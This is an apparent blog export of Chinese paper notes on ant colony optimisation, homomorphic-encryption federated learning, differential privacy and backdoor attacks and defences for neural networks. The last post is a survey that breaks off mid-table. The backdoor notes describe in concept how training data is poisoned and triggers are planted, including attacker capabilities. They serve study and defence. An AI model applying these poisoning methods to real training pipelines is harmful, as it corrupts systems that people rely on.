[{"categories":["论文笔记","论文笔记"],"contents":"概述 使用了一种深度强化学习方法自动化了启发式设计\nACO算法的灵感源于自然界中利用信息素路径进行自学习的蚁群系统，用于解决组合优化问题（Combinatorial Optimization Problems，COPs）但是在传统的meta-heuristic方法中，heuristic measure是需要基于先验知识和设计专门定义的，但是对于复杂的问题而言，这种手工定义的方法就变得非常困难\n传统的启发式学习需要手工使用专家知识先验地构造启发式设计，而本论文使用了深度学习来免除了手工设计的劳累，加强了现有的ACO（Ant Colony Optimization，蚁群优化）算法的heuristic measures\n相关工作 神经组合优化 Neural Combinatorial Optimization (NCO) 传统的NCO分为：\n端到端的：具有良好的性能，但是其性能能够通过迭代细化与算法混合进一步提升 混合的：采用了神经学习器来进行启发，在启发中使用或生成热图来辅助启发 DeapACO属于混合型的NCO\n蚁群优化 Ant Colony Optimization (ACO) ACO是一种meta-heuristic and evolutionary algorithm (EA)，使用一系列基于专家知识的hyper-heuristics进行知识驱动的适应\n与之相比DeepACO更加具有泛化性，更加不依赖于专家知识\n预备知识 COP模型 下面定义组合优化问题的模型\n简单来说，搜索空间S是由一系列离散决策变量X来定义的，并遵循一系列限制Ω，同时有一个目标函数f进行最小化/优化。而一个可行的解（非最优解）是所有决策变量满足所有限制的解。\n信息素模型 一个信息素模型是以决策变量为点、部分解为边的构造图。每一个部分解c都代表着对决策变量x的分配，并与信息素信息素试验τ和启发度量η有关。\n信息素试验τ和启发度量η决定了部分解c的可信度。其中信息素试验往往是标准初始化并迭代更新的，而启发度量是预定义与固定的。\n比如，在TSP问题（旅行商问题）中，城市i是节点i，而部分解$c_{ij}$代表在访问城市i后马上访问节点j。而启发度量η常被设置为城市i与城市j间的倒数。\n解构造 定义了如何选择下一个部分解。其中，ρ是一个COP的实例，N是步骤t之前的可行解集，α和β是控制参数（本论文中全为1）。\n由此，生成可行解s的可能性定义为：\n方法 heuristic measure学习 本文使用了图神经网络GNN（参数为θ）作为启发式学习器来参数化启发空间。启发式学习器以一个COP实例ρ作为输入计算启发度量，定义为$\\eta_{\\theta}(\\rho)或\\eta_{\\theta}$，以此为偏移，从而更改上面的生成可行解可能性的公式为：\nNLS 传统的Local Search(LS)具有贪婪性，而在DeepACO中使用了学习好的heuristic measure表示全局的最优性，但这仍然不够。\n因此，论文提出了 LS interleaved with neural-guided perturbation (NLS)\nNLS采用了两次LS，第一次LS使其不断达到局部最优，第二次LS通过多次扰动不断靠近全局最优，然后将两次LS得到的解s输入目标函数，选取使目标函数最小的解$s^*$\nheuristic learner训练 其中W是超参\n简而言之就是最小化构造解的目标函数值与NLS后的目标函数值的加权和的期望\n在实际应用中，作者使用蚁群系统来依照前文提到的概率公式随机构建解决方案，并固定信息素试验次数为1以确保估计不带偏见。作者应用了一个基于REINFORCE算法的梯度估计方法来估计上式，而梯度估计器定义为：\n三种扩展设计 Multihead decoder 在GNN顶上使用了m个MLP解码器，用于多样化启发度量\n并加入了一个新的基于KL散度的loss：\nη代表第k个解码器输出的部分解c的启发式度量值\n意思是不断最小化各个head间启发度量的差异\nTop-k entropy loss 熵损失鼓励产生更多的多样性而非一味地重复某一动作。\n而在本文的背景下，这个Top-k熵损失函数专注于在决策变量的前k个最大启发式度量的部分解上促进更大的均匀性（从而每个部分解的权重都是趋于均匀的，也就促进了多样性）\nImitation loss 有时候，我们可以获取一个问题的专家设计的启发度量，这时可以额外增加一个模仿损失（基于交叉熵损失）：\n专家设计的启发度量通常比学习得到的启发度量保守，因此它们可以作为一种正则化手段来维持探索性，避免过度专注于已经学到的策略，而如果首先完善模仿，可以保证学习到的启发度量至少不会比专家设计的启发度量差\n实验效果 ","date":"2024年02月03日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0deepaco-neural-enhanced-ant-systems-for-combinatorial-optimization/","section":"posts","summary":"概述 使用了一种深度强化学习方法自动化了启发式设计 ACO算法的灵感源于自然界中利用信息素路径进行自学习的蚁群系统，用于解决组合优化问题（Combinat","tags":["人工智能","深度学习","启发式学习"],"title":"【论文笔记】DeepACO Neural-enhanced Ant Systems for Combinatorial Optimization"},{"categories":["隐私保护","论文笔记"],"contents":"概述 性质 这是一篇关于联邦学习中如何保证分布式机器的隐私安全的文章\n相较于先前方案解决的问题 先前的方案 差分隐私（Differential Privacy）：向模型中增加噪声，但是会影响模型的精度 安全聚合（Secure Aggregation）：在聚合分布模型阶段保证中央服务器无法访问各个分布服务器的隐私信息，但是不够鲁棒 同态加密（Homomorphic Encryption）：直接在加密的信息上进行计算，并且（假如）解密得到的计算结果和在明文上计算得到的结果一致，但是耗费计算资源过大 解决的问题 解决了同态加密中耗费过大的问题\n基于同态加密的先前方案与本文方案的对比 可以看到，本文的方案同时具有以下四个特性：\nHomomorphic Encryption：允许在密文上进行运算 Threshold Key Management：需要 一定数量的成员（阈值） 合作才能实现特定的敏感操作（比如解密） Selective Parameter Encryption：只选择模型的一部分参数进行加密 Encrypted Foundation Model Training：训练加密的基础模型 同时，之前的方案只能用于小尺度的模型训练，缺乏扩展性，本文提出的方案耗费的计算资源小的多\nFedML-HE的流水线 加密密钥交换：使用分布式的Threshold Key或者第三方提供的single key 加密掩码计算：每一个客户端都使用自己的本地数据集计算一个本地模型敏感度分布图（local model sensitivity map），并最后聚合成一个加密掩码 加密联邦学习：每一个客户端都使用加密掩码保护本地模型的上传，保证服务器虽然能够聚合每一个本地模型，但是无法访问敏感的本地模型 本文的贡献 第一个实际可行的联邦学习同态加密方案，极大地降低了加密训练的成本 提出了选择参数加密方案 通过理论分析证明了在针对Threshold Key和single key的攻击下，加密最敏感的那些参数可以确保更高数量级的安全性 威胁模型 假设有一个semi-honest的攻击者$\\mathcal{A}$:\n遵守协议（一半的诚实） 希望学习到尽可能多的信息（一半的恶意） 我们希望：\n只有当$\\mathcal{A}$腐化了足够多的客户端（a subset of clients），它才能获取隐私信息 当$\\mathcal{A}$腐化了聚合服务器时，它学习不到任何来自全局模型和本地模型的隐私信息 算法 符号表 符号 含义 $\\mathcal{A}$ 攻击者 $N$ 客户端的数量 $i \\in [N]$ 每一个客户端 $\\mathcal{D}_i$ 每一个客户端的本地数据集 $W_i$ 每一个客户端的本地模型 $w_m$ 模型的参数 $\\alpha_i$ 聚合权重因子 $(p_k,s_k)$ 公钥私钥对 $M$ 加密掩码 $t \\in [T]$ 交流轮次 $[]$ 部分加密 $[![]!]$ 完整加密 $p \\in [0, 1]$ 用于选择加密的参数的ratio $b$ 差分隐私参数 算法流程 对模型进行部分加密 首先需要将数据输入模型从而计算敏感度，对每一个客户端的模型都如此计算，然后聚合到一起变成一张全局的隐私位图，再通过设置选择加密因子后就得到了加密掩码，使用这个加密掩码就能计算部分加密的模型\n计算敏感度是通过对每一个数据点都计算loss函数对模型参数的偏导数对真实标签的偏导数的绝对值得到的\n然后再通过上式对所有敏感度进行完整加密，也就是如下流程：\n然后，为了选择出最敏感的参数进行加密，要对隐私位图应用比值p，从而计算出加密掩码。这个加密掩码会发送给每一个客户端作为联邦学习的配置之一\n在每一个交流轮次，聚合服务器都执行：\n也就是说，对每一个客户端上传的模型，用加密掩码选中模型的一部分进行完整加密再乘以聚合权重因子，而剩下的部分不进行加密但是要乘以聚合因子，全部加起来就得到了部分加密的全局模型\n","date":"2024年01月25日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0fedml-he_an-efficient-homomorphic-encryption-based-privacy-preserving-federated-learning-system/","section":"posts","summary":"概述 性质 这是一篇关于联邦学习中如何保证分布式机器的隐私安全的文章 相较于先前方案解决的问题 先前的方案 差分隐私（Differential Privacy）：","tags":["人工智能","深度学习"],"title":"【论文笔记】FEDML-HE_AN EFFICIENT HOMOMORPHIC-ENCRYPTION-BASED PRIVACY-PRESERVING FEDERATED LEARNING SYSTEM"},{"categories":["后门攻击","论文笔记"],"contents":"概述 本文首先提到，在先前的研究中已经证明，感染的深度学习模型中有一些通道对trigger更加敏感。那么，很自然地就能想到，如果有一种指标能够将这些通道同普通的通道区分开，我们就可以利用剪枝为感染模型解毒。\n本文提出，可以使用Channel Lipschitz Constant (CLC)来作为指标，并通过大量实验从经验主义的角度证明了CLC的上界(UCLC)与触发器激活效应trigger-activated change（TAC）之间的强相关性，并论证了与后门相关的通道相较于普通通道具有更高的CLC。由于UCLC可以直接使用模型的权重计算得到，因此不需要任何额外的数据，这就是标题中data-free的含义。通过UCLC，论文提出了一种效率极高的Channel Lipschitzness based Pruning (CLP)剪枝方法，并通过实验证明了方法是SOTA的\n相关工作 Backdoor Attack Backdoor Defense Training Stage Defenses Model Post-processing Defenses L-Lipschitz Function 简而言之，假如存在一个函数g，使得映射后的y值差的p范数小于等于x值差的p范数乘以L，则g的Lipschitz常量就是使得这个不等式成立的最小L。\n如果换一种视角去看这个公式，$x\u0026rsquo;$可以被看成$x$的扰动后的值，那么Lipschitz常量就可以被看作输出空间的扰动与输入空间的扰动（其中输出空间的扰动是由输入空间的扰动造成的）的最大比值。因此用Lipschitz常量来测量一个函数对输入扰动的敏感性\n神经网络中的Lipschitz常量 首先，假设神经网络是线性层和非线性层通过某种运算凭借在一起的函数：\n那么，由柯西-施瓦茨不等式：\n可以得到：\n将后者写成连乘的式子，并假设$\\phi$是ReLU（ReLU的Lipschitz常量为1），同时展开Lipschitz常量的式子，可得：\n这里将每一个线性层都看成$wx+b$的形式（卷积层可以通过某种reshape变换近似变成这样的公式）。由于我们可以把Lipschitz常量的计算公式看作扰动的形式，因此$g(x)-g(x\u0026rsquo;)=w(x-x\u0026rsquo;)=wz$，而这里取二范数，因此能推导出倒数第二个公式。而后面那个$σ$就相当于命了个名（spectral norm，可能可以译作光谱范数）。\nChannel Lipschitz Constant （CLC） 我们可以将第l层的第k通道看作：\n其中输入为原数据x\n从而有：\n不等式右边的是某一个通道的Lipschitz常量（CLC）的上界，称为UCLC\nTrigger-activated Change（TAC） 这是一个客观衡量trigger对模型的影响的指标，因为需要获取trigger的样式，所以只能用作理论研究而不能实际地用于防御\n其中$\\delta$是毒化函数。\n意思就是对每一层的每一个通道都可以单独计算TAC，而这个值是由良性样本通过模型后该通道的特征向量减去由毒性样本通过该模型后该通道的特征向量的二范数，并对所有通过模型的数据取均值。\nCLC与TAC的相关性 Channel Lipschitzness based Pruning 由UCLC与TAC之间的强相关性（观察所得），我们可以设计一种基于UCLC的剪枝方法\n由于UCLC中总有一连串的连乘，所以我们可以简化UCLC的公式为$\\sigma (W_k^{(l)})$\n而阈值取值方法如下：\n从而整个算法流程：\n实验结果 ","date":"2024年01月13日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0data-free-backdoor-removal-based-on-channel-lipschitzness/","section":"posts","summary":"概述 本文首先提到，在先前的研究中已经证明，感染的深度学习模型中有一些通道对trigger更加敏感。那么，很自然地就能想到，如果有一种指标能够将这些通道","tags":["人工智能","深度学习"],"title":"【论文笔记】Data-free Backdoor Removal based on Channel Lipschitzness"},{"categories":["隐私保护","论文笔记"],"contents":"简介 开创了通过向深度学习模型的梯度进行加噪从而实现差分隐私的方法\n什么是差分隐私 差分隐私就是对两个相邻数据库有如下定义：\n简单来说，假设有两个数据库，两个数据库之间只有一个数据点不同，这样的一对数据集称为相邻数据库。而差分隐私就是保证通过向相邻数据库查询结果，不能通过查询结果来区分两个数据集。 而差分隐私通常通过加噪实现增加随机性，而其中一种加噪机制就是高斯噪声机制：\n其中$S_f$表示敏感性，敏感性表示当数据库中的一个条目发生变化时，函数的输出变化的最大量。而在此式中，敏感性是高斯噪声的标准差的一个因子，这意味着敏感性越高，高斯噪声的方差越大，从而向数据库添加的噪声的不确定性越大。 对于差分隐私而言，差分隐私具有以下性质：\nComposability可组合性：多个差分隐私算法可以组合在一起，而整体隐私损失是各个算法隐私损失的总和 Group Privacy群体隐私：差分隐私的保护不仅适用于单个数据记录，而且可以扩展到保护一组数据 Robustness to Auxiliary Information附加信息鲁棒性：差分隐私保护的效力不会因为攻击者可能拥有的其他附加信息而降低 为什么要用差分隐私 因为传统的公开数据的方法容易受到各种攻击，从而泄露隐私\n其中，深度学习模型的隐私问题是，深度学习模型会更容易记住训练集中的内容，从而在推理阶段对见过的数据（训练集的内容）的反应更加敏感，从而泄露隐私。\n如何在深度学习模型中实现差分隐私 算法流程 在模型训练的过程中，按照一定的抽样概率从数据集中抽出一些数据点（实际上就是数据集的一个batch，这里称为lot，概念上比常规的batch更大。如果由于资源限制无法处理一个lot，可以将lot切分为更小的batch），对每个数据点首先计算它的梯度，然后使用Norm Clipping对梯度进行裁剪，然后向梯度增加高斯噪声得到新的梯度，用这个新的梯度更新模型\n注意，其中对多层模型来说，可以对每一层设置不同的C和σ，对训练的不同step也是如此（t表示step）。由于差分隐私的可组合性，对不同层和不同step计算的隐私损失，只需要简单地加起来就可以了。\nNorm Clipping Norm Clipping的公式如下：\n二范数的定义如下：\n从而，这个公式的含义是，如果梯度的二范数小于阈值，就不改变梯度；如果梯度的二范数大于阈值，就将梯度缩减到阈值。之所以要这么做有以下原因：\n大梯度可能导致模型在个别数据点上过度拟合，Norm Clipping 有助于防止这种情况，从而提高模型的泛化能力 通过控制梯度的大小，可以限制个别数据点对模型的影响，这有助于确保模型输出不能用来推断出其训练数据的敏感信息 在应用差分隐私时，通常需要在保护隐私和保持模型准确性之间找到平衡。Norm clipping 通过减少单个数据点对模型的影响，帮助实现这一平衡 这种方法在不考虑差分隐私的情况下也经常被使用（梯度裁剪）\nMoments Accountant 矩会计 基本组合定理（Basic Composition Theorem） 基本组合定理指出，如果我们有多个算法，每个都满足 (ε,δ)-差分隐私，那么将这些算法顺序执行的整体过程满足 (kε,kδ)-差分隐私，其中 k 是算法的数量。这个定理给出了一个保守的隐私损失估计。\n强组合定理（Strong Composition Theorem） 强组合定理是对基本组合定理的一个改进。它提供了一个更紧凑的隐私损失上界。强组合定理表明，如果多个算法每个都满足 (ε,δ)-差分隐私，那么整个序列的隐私损失可以用更小的上界来估计。具体来说，对于一系列的 (ε,δ)-差分隐私算法，整体过程满足(ε′,kδ+δ′)-差分隐私，其中 ε′ 通常远小于_kε_。\n强组合定理的局限性 一般性的上界：强组合定理提供了一个一般性的隐私损失上界，适用于各种不同的差分隐私操作。然而，这个上界可能不是针对特定情况或特定噪声分布最紧致的。 不考虑特定噪声分布：强组合定理的一个关键局限是它没有考虑噪声分布的具体形式。不同类型的噪声（如高斯噪声、拉普拉斯噪声等）对于隐私保护的效果可能有显著差异，而强组合定理并没有区分这些差异。 (ε,δ)的含义 他们是差分隐私的定义中的两个参数\nε（epsilon）：这个参数描述了隐私保护的强度。较小的 ε 值意味着更强的隐私保护，因为它保证算法的输出对单个数据项的改变不敏感。具体来说，ε 控制了算法对于邻近数据集（只相差一个数据项的两个数据集）给出不同结果的概率。当 ε 较小时，这种概率差异较小，从而更难从输出结果中推断出任何个人信息。 δ（delta）：这是一个小概率事件，在该事件中，ε 定义的隐私保护可能会失败。较小的 δ 表示这种失败的概率很低。理想情况下，δ 应该小到足以被忽略（例如，远小于数据集中单个个体的倒数）。 论文中的定理一 该定理说明了σ应该如何选择才能获取更精确的隐私损失估计，并考虑到了高斯噪声的分布特征。\n其中，\nσ 是高斯噪声的标准差。 $c_2$ 是一个常数，它取决于证明中使用的不等式和假设。 q 是每次迭代中随机抽取的样本与总体样本数量的比例。 T 是总的训练迭代次数。 ε 是差分隐私中的隐私损失参数。 δ 是允许的隐私保护失败概率。 隐私损失定义 隐私损失度量了在给定的输出结果下，一个观察者能够从算法的执行中区分两个相邻数据库的能力\n而为了获得更紧致的隐私损失定义，论文提出了计算隐私损失对数矩（log moments）的方法\nλ阶矩/对数矩的定义 对于给定的机制 M ，相邻数据库d, d\u0026rsquo;，以及辅助输入 aux ，$\\alpha_M(\\lambda; aux, d, d\u0026rsquo;)$被定义为隐私损失的对数矩生成函数在值 λ 处的对数。\n$\\alpha_M(\\lambda; aux, d, d\u0026rsquo;) = \\log \\mathbb{E}_{o \\sim M(aux,d)}[\\exp(\\lambda c(o; M, aux, d, d\u0026rsquo;))]$\n这里：\n$\\mathbb{E}_{o \\sim M(aux,d)}$表示对于随机变量o，其分布由给定数据库d和辅助输入aux下的机制M确定的期望值。 $\\exp(\\lambda c(o; M, aux, d, d\u0026rsquo;))$是隐私损失$c(o; M, aux, d, d\u0026rsquo;)$的指数函数放大λ倍的结果。 $c(o; M, aux, d, d\u0026rsquo;)$是给定输出o时，从d到d\u0026rsquo;数据库变化的隐私损失。 对数矩和统计学中的高阶矩的联系 在统计学中，一个随机变量X的k阶原始矩是$E[X^k]$，即X的k次幂的期望值。而一个随机变量的k阶中心矩是$E[(X - E[X])^k]$，即X减去其期望值（均值）的k次幂的期望值。中心矩提供了关于随机变量分布形状的信息。例如，二阶中心矩是方差，它衡量了随机变量的离散程度；三阶中心矩与数据的偏斜（skewness）有关；四阶中心矩与数据的峰度（kurtosis）有关，等等。\n矩生成函数（MGF）$M_X(t)$是所有原始矩的无穷级数，定义为$M_X(t) = E[e^{tX}]$，其中t是实数。实际上，如果对M_X(t)关于 (t) 进行泰勒级数展开，你会得到X的所有原始矩。即：\n$M_X(t) = E[e^{tX}] = 1 + \\frac{tE[X]}{1!} + \\frac{t^2E[X^2]}{2!} + \\frac{t^3E[X^3]}{3!} + \\cdots$\n在差分隐私中，对数矩生成函数（log-MGF）定义为 $M_X(t)$的对数。对于差分隐私中的隐私损失随机变量L，log-MGF 记为$\\alpha_L(\\lambda) = \\log E[e^{\\lambda L}]$。这个函数对于任何正数λ，给出了$e^{\\lambda L}$ 的期望值的对数。通过对$\\alpha_L(\\lambda)$进行泰勒级数展开可以得到关于隐私损失L的所有原始矩的信息。\n论文中的定理二 对于上面定义的对数矩，有如下特性：\n可组合性：如果我们有一系列机制 $\\mathcal{M}_1,\\cdots,\\mathcal{M}_k$ 则总的对数矩 $\\alpha_{\\mathcal{M}}(\\lambda)$ 可以通过对每个机制的对数矩求和来估计。 尾部界限：通过尾部界限能够计算δ，保证总体机制$\\mathcal{M}$保持 (ε,δ)-差分隐私。 如何估计对数矩$\\alpha_{\\mathcal{M}}(\\lambda)$ 通过两个高斯分布的概率密度函数合成一个新的概率密度函数，然后使用这三个概率密度函数计算两个期望。而在实际的实现中，论文使用数值积分来计算。\n同时，作者给出了对数矩的一个渐进界：\n如何实际应用 假设正在训练一个深度学习模型，并在每次迭代中使用高斯噪声来保持(ε,δ)-差分隐私\n在每一步计算每个参数更新的隐私损失。 使用对数矩来跟踪这些损失。 应用定理 2 来确保累积的隐私损失保持在(ε,δ) 范围内。 根据上述累积损失来调整高斯噪声水平。 ","date":"2024年01月13日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0deep-learning-with-differential-privacy/","section":"posts","summary":"简介 开创了通过向深度学习模型的梯度进行加噪从而实现差分隐私的方法 什么是差分隐私 差分隐私就是对两个相邻数据库有如下定义： 简单来说，假设有两个数据库，两个","tags":["差分隐私"],"title":"【论文笔记】Deep Learning with Differential Privacy"},{"categories":["posts","后门攻击"],"contents":"概述 本论文基于两种防御者的场景进行防御：\n防御者在基于一个被毒化的数据集进行训练，希望训练出干净的模型 已经训练好了一个感染模型，防御者需要去除其中的毒化神经元 分别对这两种防御场景提出了两种防御方式：\n基于differential entropy的毒化神经元检测 基于KL散度和BN层记忆的毒化神经元检测 而这两种防御方式都以作者提出的两种假设为前提\n并证明论文提出的防御方式是SOTA的\n相关工作 相关工作提到了Backdoor attacks、Backdoor defenses、Distributional properties in poisoned dataset。这三个相关工作说明本论文的性质是一篇为了抵抗后门攻击，利用毒化数据集的分布特性进行后门防御的文章。\n三个重要定义 后门损失 神经元敏感度 后门神经元 简而言之，后门损失是使用分类器的输出计算的交叉熵损失，神经元敏感度是剪枝前后的后门损失的差值，通过后门神经元是神经元敏感度大于一个预定义阈值的神经元\nDifferential Entropy 离散随机变量的熵公式的连续版本\n对熵而言，有一个基本事实：高斯分布的熵是最大的（对于分布在正无穷和负无穷间的实值分布而言）\nPre-activation 假设一个模型由线性和非线性函数构成，那么一个模型能定义如下：\n我们将pre-activation定义为在经过非线性激活函数前第l层第k个神经元的最大值：\n对pre-activation，有如下观察事实：\n两个基本假设 假设一保证剪枝能够防御后门攻击 假设二保证本论文的理论有效 这个假设是基于经验（上面的观察事实）归纳所得，简而言之就是每一个pre-activation的分布都是高斯函数的混合，并且两个用于混合的高斯函数都遵循两个限制，并且这两个限制对良性神经元与后门神经元是不同的\n场景一的防御：基于熵的剪枝 由上述假设，很容易推导出如下推论：\n简而言之，意思就是后门神经元的pre-activation的differential entropy小于良性神经元的小于等于标准高斯分布的\n原因是高斯分布的熵是最大的，而所有神经元都假设是高斯分布的混合，是近似于高斯分布的分布，但是后门神经元的偏离最大（由观察事实可知），所以这个等式成立\n通过这个指标，我们就可以区分后门神经元和良性神经元，从而进行剪枝\n场景二的防御：基于BN统计的KL散度剪枝 BN层会统计样本数据用于归一化并进行记忆：\n因为毒化数据集会使pre-activation的分布严重偏离高斯分布，因此我们可以期望BN层中的统计数据也受到了偏移。\n而如果此时我们拥有一小批良性数据，我们就可以获取未受偏移的统计数据\n通过计算两个数据之间的KL散度（假设两个数据分布都遵循高斯分布）：\n我们能得到第二个推论：\n意思是对后门神经元计算的KL散度要大于良性神经元的KL散度，后者趋于（等于）0\n如何取阈值τ 场景一 意思是，l层的τ = l层的所有神经元的微分熵的均值 - 超参数u * l层l层的所有神经元的微分熵的标准差\n场景二 意思是，l层的τ = l层的所有神经元的KL散度的均值 - 超参数u * l层l层的所有神经元的KL散度的标准差\n实验结果 论文的方法有以下优势：\nBetter performance Higher efficiency More robust to hyperparameter choosing ","date":"2024年01月12日","permalink":"https://peterliuzhi.top/posts/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/%E5%90%8E%E9%97%A8%E6%94%BB%E5%87%BB/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0pre-activation-distributions-expose-backdoor-neurons/","section":"posts","summary":"概述 本论文基于两种防御者的场景进行防御： 防御者在基于一个被毒化的数据集进行训练，希望训练出干净的模型 已经训练好了一个感染模型，防御者需要去除其中的毒化","tags":["论文笔记"],"title":"【论文笔记】Pre-activation Distributions Expose Backdoor Neurons"},{"categories":["posts"],"contents":"请查看NeurIPS的搜索页面\n","date":"2024年01月11日","permalink":"https://peterliuzhi.top/posts/neurips%E8%BF%91%E5%B9%B4%E5%85%B3%E4%BA%8Ebackdoorattack%E7%9A%84%E6%96%87%E7%AB%A0/","section":"posts","summary":"请查看NeurIPS的搜索页面","tags":["杂谈"],"title":"NeurIPS近年关于BackdoorAttack的文章"},{"categories":["principle","深度学习"],"contents":" The smallest deed is better than the greatest intention. — John Burroughs\n参考：\n[2007.08745] Backdoor Learning: A Survey\n[2104.02361] Backdoor Attack in the Physical World\n深度学习训练和推理有何不同？\n后门攻击概述 兼 论文笔记-Backdoor Learning: A Survey\n概述 后门攻击的背景 什么是后门攻击 后门攻击的防御措施 常见术语以及威胁场景 术语定义 经典的威胁场景和相应的能力 三大场景 能力大小 现有的后门攻击 基于 poison（投毒）的后门攻击 Poisoning-based 攻击的统一框架 概括图与总结表 数学符号表 后门攻击的数学定义 评价标准 对图像和视频的攻击的分类 BadNets / Visible Backdoor Attacks 坏网/可见后门攻击 Invisible Backdoor Attacks 不可见后门攻击 其他基于不可见后门攻击的后门攻击 clean-label invisible attacks 纯净标签不可见攻击 Optimized Backdoor Attacks 优化后门攻击 Semantic Backdoor Attacks 语义后门攻击 Sample-specific Backdoor Attacks 特定样本后门攻击 Physical Backdoor Attacks 物理后门攻击 All-to-all Backdoor Attacks 全对全后门攻击 Black-box Backdoor Attacks 黑盒后门攻击 对其他领域或范式的攻击 积极目的的后门攻击/正能量后门攻击 非基于 poison（投毒）的后门攻击 面向权重的后门攻击 修改结构的后门攻击 后门攻击与相关领域的关系 后门防御的阐释和分类 经验后门攻击 Preprocessing-based Defenses 基于预处理的防御 Model Reconstruction based Defenses 基于重构模型的防御 Trigger Synthesis based Defenses 基于触发器合成的防御 Model Diagnosis based Defenses 基于模型诊断的防御 Poison Suppression based Defenses 基于中毒抑制的防御 Training Sample Filtering based Defenses 基于训练样本过滤的防御 Testing Sample Filtering based Defenses 基于测试样本过滤的防御 Certified Backdoor Defenses 认证后门攻击 评价指标 检测型经验防御的指标 非检测型经验防御的指标 认证防御的指标 概述 后门攻击的背景 训练阶段相较于推理阶段有更多步骤，也就意味着更多的攻击的可能性 训练阶段所需数据的庞大以及第三方开源数据库的便利性 什么是后门攻击 一般来说，后门攻击者打算在训练过程中将隐藏后门嵌入 DNN 中，使得受攻击的 DNN在良性样本上正常表现，而如果隐藏后门被攻击者指定的触发模式激活，则其预测将被恶意且一致地改变。\n目前最广泛、直接的方式 -\u0026gt; 样本投毒\n后门攻击可能发生在训练过程中涉及的所有步骤。\n后门攻击的防御措施 empirical backdoor defenses 经验后门防御，基于对现有攻击的一些观察或理解而提出的，并且在实践中具有良好的性能 -\u0026gt; 没有理论支撑，容易被自适应攻击绕过 certified backdoor defenses 认证后门防御，在某些假设下得到保证，然而其性能通常弱于实践中的经验防御，因为这些假设通常不满足 常见术语以及威胁场景 术语定义 Benign model 良性模型：良性环境下训练的模型 Infected model 感染模型：藏有后门的模型 Poisoned sample 中毒样本：用于嵌入后门的被修改的样本 Trigger 触发器：用于生成中毒样本和激活隐藏后门的模式（pattern） Attacked sample 被攻击样本：包含后门触发器的恶意测试样本 Attack scenario 攻击场景：后门攻击可能发生的场景（往往出现在训练过程无法访问或用户无法控制时） Source label 来源标签：中毒或受攻击样本的真实标签 Target label 目标标签：攻击者指定的标签 Attack success rate (ASR) 攻击成功率：感染模型成功将被攻击样本预测为目标标签的比例 Benign accuracy (BA) 良性准确度：由感染模型预测的良性样本的准确度 Attacker’s goal 攻击者目标：后门攻击者的目标 Capacity 能力：攻击者/防御者为了实现他们的目标可以做什么和不可以做什么 Attack/Defense approach 攻击/防御方法：设计的后门攻击/防御运作的过程 注：其中有些中文翻译是我瞎扯的\n下图综合了上述术语描述了一个基本的后门攻击过程：\n通过触发器生成被修改过的中毒样本并和良性样本在训练过程被一同输入给深度神经网络，在推理阶段良性样本和含有触发器的被攻击样本意同输入给训练好的感染模型，最后测试其良性准确度和攻击成功率\n经典的威胁场景和相应的能力 三大场景 使用第三方数据集。 攻击者只能操纵数据集，而不能修改模型、训练时间表（schedule）和推理流水线（pipeline） 防御者可以操控一切 使用第三方平台。用户将其（良性）数据集、模型结构和训练时间表提供给不可信的第三方平台（例如，Google Cloud）来训练他们的模型 攻击者可以控制时间表、推理流水线，单不能更改模型 防御者可以调整模型减轻攻击，但是不能完全控制时间表和推理流水线 使用第三方模型（往往是开源模型） 攻击者可以控制除了推理流水线之外的所有东西 防御者可以控制推理流水线 当模型的源码是可获取的，那么防御者也能控制模型（如果防御者足够细心的话） 能力大小 从场景一到场景三，攻击者的能力递增而防御者的能力递减\n可以看到，后面两种场景都比较难以实现，只有第一种场景虽然能力最小，但是最容易实现\n有没有一种可能，通过场景一的攻击转换到场景二、三从而扩大能力？ 或许有一种方法，可以通过场景一的样本投毒从而对模型使用的 API 进行偷梁换柱？某种类似于二进制漏洞的攻击？ \u0026mdash;\u0026gt; 感觉是天方夜谭中的天方夜谭\u0026hellip;\n现有的后门攻击 基于 poison（投毒）的后门攻击 Poisoning-based 攻击的统一框架 概括图与总结表 数学符号表 数学符号 意义 $w$ 模型参数 $f_{w}:\\chi \\to \\left [ 0, 1 \\right ]^{K}$ 分类器 $\\chi \\subset \\mathbb{R}^{\\textit{d}}$ 样本实例空间 $\\mathcal{Y} = {1, 2, \\cdots ,K}$ 标签空间 $f(x)$ 关于 K 类的后验（概率）向量 $C(x) = argmax f_{w}(x)$ 预测的标签 $t$ 触发器 $G_{t}: \\chi \\to \\chi$ 攻击者指定的中毒图像生成器 $x^{\u0026rsquo;} = G_{t}(x)$ 被攻击图像/样本 $S: \\mathcal{Y} \\to \\mathcal{Y}$ 攻击者指定的标签转换函数 $\\mathcal{D} = {(x_{i}, y_{i})}_{i=1}^{N}$ 良性数据集 $\\mathcal{P}_{\\mathcal{D}}$ 良性数据集背后的分布 $\\mathbb{I}{\\cdot }$ 指示函数 indicator function，$\\mathbb{I}{A } = 1$当且仅当事件$A$为真 $D(\\cdot)$ 指示函数，$D{x\u0026rsquo; } = 1$当且仅当事件$x\u0026rsquo;$可以被检测为恶意样本 $\\lambda_{1},\\lambda_{2}$ 两个非负的权重超参 后门攻击的数学定义 名称 解释 符号 数学定义 简易解释 标准风险 standard risk 测量感染模型$C$是否可以正确地预测良性样本，越大越不能 $R_{s}$ $R_{s}(\\mathcal{D}) = \\mathbb{E}{(x, y)\\sim \\mathcal{P}{\\mathcal{D}}}\\mathbb{I}{C(x)\\neq y}$ 服从于良性数据集背后的分布的期望乘以预测标签是否不等于真标签 后门风险 backdoor risk 后门攻击者是否能实现其恶意目的，越大越不能 $R_{b}$ $R_{b}(\\mathcal{D}) = \\mathbb{E}{(x, y)\\sim \\mathcal{P}{\\mathcal{D}}}\\mathbb{I}{C(x\u0026rsquo;)\\neq S(y)}$ 